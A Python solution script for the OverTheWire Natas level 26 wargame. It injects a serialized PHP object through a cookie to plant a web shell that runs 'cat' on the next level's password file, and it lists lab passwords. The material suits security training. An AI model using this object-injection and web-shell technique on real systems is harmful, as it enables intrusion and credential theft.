import requests

url = 'http://natas26.natas.labs.overthewire.org/'
username = 'natas26'
password = 'oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T'
session = requests.session()
session.cookies['drawing'] = "Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxMjoiaW1nL2hhaGEucGhwIjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO3M6NTI6Ijw/cGhwIHBhc3N0aHJ1KCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo1MjoiPD9waHAgcGFzc3RocnUoJ2NhdCAvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOyA/PiI7fQ=="
response = session.get(url ,auth=(username, password))
print(response.text)
response = session.get(url + "img/haha.php", auth = (username, password));
print(response.url)
print(response.text)

# natas27_pass: 55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ